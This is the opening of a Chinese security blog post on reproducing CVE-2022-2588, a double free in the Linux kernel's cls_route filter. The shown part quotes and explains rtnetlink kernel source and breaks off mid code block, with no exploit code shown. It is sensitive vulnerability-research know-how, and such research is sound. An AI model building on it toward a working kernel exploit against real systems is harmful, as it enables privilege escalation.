<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="196082">
    
    <title>
        
            CVE-2022-2588复现 |
        
        196082&#39;s blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/ufo.ico">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/css/font-awesome.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"cv196082.gitee.io","root":"/","language":"zh-CN","path":"search.json"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/ling.JPG","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.3"};
    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
  </script>
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
</head>


<body>
<div class="progress-bar-container">
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                196082&#39;s blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                首页
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                归档
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                分类
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                标签
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">首页</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">归档</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">分类</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">标签</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">CVE-2022-2588复现</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/images/ling.JPG">
                </div>
                <div class="info">
                    <div class="author">
                        <span class="name">196082</span>
                        
                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-edit"></i>&nbsp;2023-10-27 16:39:53
    </span>
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/Linux-Kernel/">Linux Kernel</a>&nbsp;
                    </li>
                
                    <li>
                        &gt; <a href="/categories/Linux-Kernel/CVE%E5%A4%8D%E7%8E%B0/">CVE复现</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/Rtnetlink/">Rtnetlink</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/Dirty-Cred/">Dirty Cred</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>11.3k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>59 分钟</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本来不想分析CVE了，无奈前面提到了内核内部隔离机制，而在往期的文章中只在<a href="https://cv196082.gitee.io/2023/05/24/pipe-buffer/">向pipe_buffer说yes！</a> 文章中简要提到过通过实现页级的UAF来实现绕过的，可是还存在一种技术可以绕过，如果不记录下来是真的心痒，所以只能把<code>syzkaller</code>的学习计划往后推推进而来分析这一个利用方法。文件创建时间是10月19号，<del>不想写文章了，懒狗症犯了</del></p>
<p>回到正题，这一漏洞出现在流量控制子系统包分类器的<code>cls_route</code>过滤器中，当旧过滤器的句柄为0时，在释放之前内核不会从哈希表中将其删除从而产生的Double Free。</p>
<h2 id="Rtnetlink简述"><a href="#Rtnetlink简述" class="headerlink" title="Rtnetlink简述"></a>Rtnetlink简述</h2><p><del>这里直接抄我参考文章的原文，绝对不是我懒得写</del></p>
<p>Rtnetlink是所有内核网络子系统使用的网络连接总线，包括网络接口、路由、fdb和邻居。一些内核网络子系统也在通用netlink总线上提供服务。Linux内核网络子系统使用消息类型和系列向Rtnetlink内核注册处理程序。Rtnetlink允许读取和更改内核的路由表。它在内核中用于在各种子系统之间进行通信，也用于与用户空间程序进行通信。网络路由、IP地址、链接参数、邻居设置、排队规则、流量类别和数据包分类器都可以通过NETLINK_ROUTE套接字进行控制。Rtnetlink由以下消息类型组成（除了标准的netlink消息）：</p>
<ul>
<li>  RTM_NEWLINK、RTM_DELLINK、RTM_GETLINK创建、删除或获取有关特定网络接口的信息。</li>
<li>  RTM_NEWADDR、RTM_DELADDR、RTM_GETADDR添加、删除或接收有关与接口关联的IP地址的信息。</li>
<li>  RTM_NEWROUTE、RTM_DELROUTE、RTM_GETROUTE创建、删除或接收有关网络路由的信息。</li>
<li>  RTM_NEWNEIGH、RTM_DELNEIGH、RTM_GETNEIGH添加、删除或接收有关邻居表条目的信息（例如，ARP条目）。</li>
<li>  RTM_NEWRULE、RTM_DELRULE、RTM_GETRULE添加、删除或检索路由规则。</li>
<li>  RTM_NEWQDISC、RTM_DELQDISC、RTM_GETQDISC添加、删除或获取排队规则。</li>
<li>  RTM_NEWTCLASS、RTM_DELTCLASS、RTM_GETTCLASS添加、删除或获取流量类别。</li>
<li>  RTM_NEWTFILTER, RTM_DELTFILTER, RTM_GETTFILTER添加、删除或接收有关流量过滤器的信息。</li>
</ul>
<h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><p>首先，当内核启动加载时会初始化<code>netlink</code>协议，此时会通过调用<code>rtnetlink_init</code>函数初始化路由<code>netlink socket</code>接口</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __init <span class="title">rtnetlink_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (register_pernet_subsys(&amp;rtnetlink_net_ops))</span><br><span class="line">		panic(<span class="string">&quot;rtnetlink_init: cannot initialize rtnetlink\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	register_netdevice_notifier(&amp;rtnetlink_dev_notifier);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETLINK, rtnl_getlink,</span><br><span class="line">		      rtnl_dump_ifinfo, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_SETLINK, rtnl_setlink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_NEWLINK, rtnl_newlink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_DELLINK, rtnl_dellink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETADDR, <span class="literal">NULL</span>, rtnl_dump_all, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETROUTE, <span class="literal">NULL</span>, rtnl_dump_all, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETNETCONF, <span class="literal">NULL</span>, rtnl_dump_all, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_NEWLINKPROP, rtnl_newlinkprop, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_DELLINKPROP, rtnl_dellinkprop, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_NEWNEIGH, rtnl_fdb_add, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_DELNEIGH, rtnl_fdb_del, <span class="literal">NULL</span>,</span><br><span class="line">		      RTNL_FLAG_BULK_DEL_SUPPORTED);</span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_GETNEIGH, rtnl_fdb_get, rtnl_fdb_dump, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_GETLINK, <span class="literal">NULL</span>, rtnl_bridge_getlink, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_DELLINK, rtnl_bridge_dellink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_SETLINK, rtnl_bridge_setlink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETSTATS, rtnl_stats_get, rtnl_stats_dump,</span><br><span class="line">		      <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_SETSTATS, rtnl_stats_set, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由上面的代码可以看出来的，主要是通过<code>rtnl_register</code>函数将不同的消息类型和对应的操作进行了绑定，这里简单看一下这个函数定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtnl_register</span><span class="params">(<span class="keyword">int</span> protocol, <span class="keyword">int</span> msgtype,</span></span></span><br><span class="line"><span class="params"><span class="function">		   rtnl_doit_func doit, rtnl_dumpit_func dumpit,</span></span></span><br><span class="line"><span class="params"><span class="function">		   <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	err = rtnl_register_internal(<span class="literal">NULL</span>, protocol, msgtype, doit, dumpit,</span><br><span class="line">				     flags);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		pr_err(<span class="string">&quot;Unable to register rtnetlink message handler, &quot;</span></span><br><span class="line">		       <span class="string">&quot;protocol = %d, message type = %d\n&quot;</span>, protocol, msgtype);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现这个函数其实就是<code>rtnl_register_internal</code>套了一层壳，这里主要关注<code>rtnl_register</code>的参数定义。前面就是协议，消息类型。紧随的这两个分别是两个毁掉函数被传入，而这两个毁掉函数对应的是两种类型，第一种是动作函数，第二种是dump函数dumpit，而从上面的初始化函数来看是有的消息只存在第一个有的只有第二个，还有的两者都有。从前面的简述中看到其实有的消息类型是没被初始化的比如<code>RTM_NEWTFILTER</code>，添加一个流量过滤器，其是在<code>tc_filter_init</code>函数中被初始化的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">tc_filter_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	tc_filter_wq = alloc_ordered_workqueue(<span class="string">&quot;tc_filter_workqueue&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (!tc_filter_wq)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	err = register_pernet_subsys(&amp;tcf_net_ops);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> err_register_pernet_subsys;</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_NEWTFILTER, tc_new_tfilter, <span class="literal">NULL</span>,</span><br><span class="line">		      RTNL_FLAG_DOIT_UNLOCKED);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_DELTFILTER, tc_del_tfilter, <span class="literal">NULL</span>,</span><br><span class="line">		      RTNL_FLAG_DOIT_UNLOCKED);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETTFILTER, tc_get_tfilter,</span><br><span class="line">		      tc_dump_tfilter, RTNL_FLAG_DOIT_UNLOCKED);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_NEWCHAIN, tc_ctl_chain, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_DELCHAIN, tc_ctl_chain, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETCHAIN, tc_ctl_chain,</span><br><span class="line">		      tc_dump_chain, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_register_pernet_subsys:</span><br><span class="line">	destroy_workqueue(tc_filter_wq);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当用户通过<code>NETLINK_ROUTE</code>套接字发送<code>RTM_NEWTFILTER</code>消息用于创建一个流量过滤器时，内核会调用<code>rtnetlink_rcv_msg</code>函数来处理<code>rtnetlink</code>消息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rtnetlink_rcv_msg</span><span class="params">(struct sk_buff *skb, struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">			     struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> sock_net(skb-&gt;sk);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rtnl_link</span> *<span class="title">link</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">rtnl_kinds</span> <span class="title">kind</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EOPNOTSUPP;</span><br><span class="line">	rtnl_doit_func doit;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">int</span> family;</span><br><span class="line">	<span class="keyword">int</span> type;</span><br><span class="line"></span><br><span class="line">	type = nlh-&gt;nlmsg_type;</span><br><span class="line">	<span class="keyword">if</span> (type &gt; RTM_MAX)</span><br><span class="line">		<span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">	type -= RTM_BASE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* All the messages must have at least 1 byte length */</span></span><br><span class="line">	<span class="keyword">if</span> (nlmsg_len(nlh) &lt; <span class="keyword">sizeof</span>(struct rtgenmsg))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	family = ((struct rtgenmsg *)nlmsg_data(nlh))-&gt;rtgen_family;</span><br><span class="line">	kind = rtnl_msgtype_kind(type);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (kind != RTNL_KIND_GET &amp;&amp; !netlink_net_capable(skb, CAP_NET_ADMIN))</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	<span class="keyword">if</span> (kind == RTNL_KIND_GET &amp;&amp; (nlh-&gt;nlmsg_flags &amp; NLM_F_DUMP)) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">rtnl</span>;</span></span><br><span class="line">		rtnl_dumpit_func dumpit;</span><br><span class="line">		u32 min_dump_alloc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		link = rtnl_get_link(family, type);</span><br><span class="line">		<span class="keyword">if</span> (!link || !link-&gt;dumpit) &#123;</span><br><span class="line">			family = PF_UNSPEC;</span><br><span class="line">			link = rtnl_get_link(family, type);</span><br><span class="line">			<span class="keyword">if</span> (!link || !link-&gt;dumpit)</span><br><span class="line">				<span class="keyword">goto</span> err_unlock;</span><br><span class="line">		&#125;</span><br><span class="line">		owner = link-&gt;owner;</span><br><span class="line">		dumpit = link-&gt;dumpit;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (type == RTM_GETLINK - RTM_BASE)</span><br><span class="line">			min_dump_alloc = rtnl_calcit(skb, nlh);</span><br><span class="line"></span><br><span class="line">		err = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">/* need to do this before rcu_read_unlock() */</span></span><br><span class="line">		<span class="keyword">if</span> (!try_module_get(owner))</span><br><span class="line">			err = -EPROTONOSUPPORT;</span><br><span class="line"></span><br><span class="line">		rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">		rtnl = net-&gt;rtnl;</span><br><span class="line">		<span class="keyword">if</span> (err == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">netlink_dump_control</span> <span class="title">c</span> =</span> &#123;</span><br><span class="line">				.dump		= dumpit,</span><br><span class="line">				.min_dump_alloc	= min_dump_alloc,</span><br><span class="line">				.<span class="keyword">module</span>		= owner,</span><br><span class="line">			&#125;;</span><br><span class="line">			err = netlink_dump_start(rtnl, skb, nlh, &amp;c);</span><br><span class="line">			<span class="comment">/* netlink_dump_start() will keep a reference on</span></span><br><span class="line"><span class="comment">			 * module if dump is still in progress.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			module_put(owner);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	link = rtnl_get_link(family, type);</span><br><span class="line">	<span class="keyword">if</span> (!link || !link-&gt;doit) &#123;</span><br><span class="line">		family = PF_UNSPEC;</span><br><span class="line">		link = rtnl_get_link(PF_UNSPEC, type);</span><br><span class="line">		<span class="keyword">if</span> (!link || !link-&gt;doit)</span><br><span class="line">			<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	owner = link-&gt;owner;</span><br><span class="line">	<span class="keyword">if</span> (!try_module_get(owner)) &#123;</span><br><span class="line">		err = -EPROTONOSUPPORT;</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	flags = link-&gt;flags;</span><br><span class="line">	<span class="keyword">if</span> (kind == RTNL_KIND_DEL &amp;&amp; (nlh-&gt;nlmsg_flags &amp; NLM_F_BULK) &amp;&amp;</span><br><span class="line">	    !(flags &amp; RTNL_FLAG_BULK_DEL_SUPPORTED)) &#123;</span><br><span class="line">		NL_SET_ERR_MSG(extack, <span class="string">&quot;Bulk delete is not supported&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> err_unlock;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; RTNL_FLAG_DOIT_UNLOCKED) &#123;</span><br><span class="line">		doit = link-&gt;doit;</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		<span class="keyword">if</span> (doit)</span><br><span class="line">			err = doit(skb, nlh, extack);</span><br><span class="line">		module_put(owner);</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">	&#125;</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	rtnl_lock();</span><br><span class="line">	link = rtnl_get_link(family, type);</span><br><span class="line">	<span class="keyword">if</span> (link &amp;&amp; link-&gt;doit)</span><br><span class="line">		err = link-&gt;doit(skb, nlh, extack);</span><br><span class="line">	rtnl_unlock();</span><br><span class="line"></span><br><span class="line">	module_put(owner);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">err_unlock:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到函数的主要逻辑，首先是在消息中取出其<code>family</code>和<code>type</code>，紧接着根绝<code>family</code>和<code>type</code>回去到<code>link</code>。在最后调用<code>link-&gt;doit(skb, nlh, extack)</code>，由前面的函数可以得知的是其会调用如下函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span 